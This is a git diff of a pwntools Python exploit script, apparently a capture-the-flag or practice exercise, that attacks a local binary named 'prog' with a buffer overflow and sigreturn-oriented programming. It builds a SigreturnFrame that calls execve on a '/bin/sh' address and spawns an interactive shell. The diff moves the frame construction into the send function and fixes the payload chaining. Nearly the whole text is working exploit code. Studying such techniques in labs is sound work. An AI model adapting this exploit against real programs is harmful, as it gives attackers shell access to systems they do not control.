@@ -1,26 +1,36 @@
 from pwn import *
 
-context(terminal=["tmux","wsplit","-h"])
-context.arch = "amd64"
+binsh = 0xb4
+
 context.delete_corefiles = True
 
-syscall = 0x1142
-binsh = 0x304d
-
-def send_payload(srop_frame,offset):
+def send_payload(offset):
+    context(terminal=["tmux","splitw","-h"])
+    context.arch = "amd64"
 
     global elf
     rop = ROP(elf)
     pop_rax = rop.find_gadget(['pop rax','ret'])[0]
+    syscall = rop.find_gadget(['syscall'])[0]
+    execve = constants.SYS_execve
+
+    frame = SigreturnFrame(kernel='amd64')
+    frame.rax = execve
+    frame.rdi = binsh
+    frame.rsi = 0
+    frame.rdx = 0
+    frame.rsp = 0xdeadbeef
+    frame.rip = syscall
 
     payload = "A" * offset
-    payload = p64(pop_rax)
-    payload = p64(0xf)
-    payload += srop_frame
+    payload += p64(pop_rax)
+    payload += p64(0xf)
+    payload += p64(syscall)
+    payload += str(frame)
+    payload += p64(syscall)
 
     p = process(elf.path)
     log.info("Sending exploit")
-    p.gdb_attach(p)
     p.sendline(payload)
     p.interactive()
 
@@ -64,14 +74,4 @@ if __name__ == '__main__':
     elf = ELF('prog')
 
     offset = locate_offset()
-
-    frame = SigreturnFrame(kernel='amd64')
-    frame.rax = constants.SYS_execve
-    frame.rdi = binsh
-    frame.rsi = 0
-    frame.rdx = 0
-    frame.rsp = 0xdeadbeef
-    frame.rip = syscall
-
-    send_payload(str(frame),offset)
-    
+    send_payload(offset)
